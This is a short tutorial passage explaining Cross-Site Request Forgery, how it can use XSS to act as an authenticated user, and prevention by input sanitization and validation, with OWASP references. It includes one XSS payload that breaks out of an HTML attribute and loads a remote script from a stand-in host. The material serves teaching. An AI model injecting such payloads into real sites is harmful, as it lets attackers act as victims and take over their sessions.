The third type of front end vulnerability that is caused by unfiltered user input is [Cross-Site Request Forgery (CSRF)](https://owasp.org/www-community/attacks/csrf). `CSRF` attacks may utilize `XSS` vulnerabilities to perform certain queries, and `API` calls on a web application that the victim is currently authenticated to. This would allow the attacker to perform actions as the authenticated user. It may also utilize other vulnerabilities to perform the same functions, like utilizing HTTP parameters for attacks.

```html
"><script src=//www.example.com/exploit.js></script>
```
## Prevention
|Type|Description|
|---|---|
|`Sanitization`|Removing special characters and non-standard characters from user input before displaying it or storing it.|
|`Validation`|Ensuring that submitted user input matches the expected format (i.e., submitted email matched email format)|
This [Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) from OWASP discusses the attack and prevention measures in greater detail.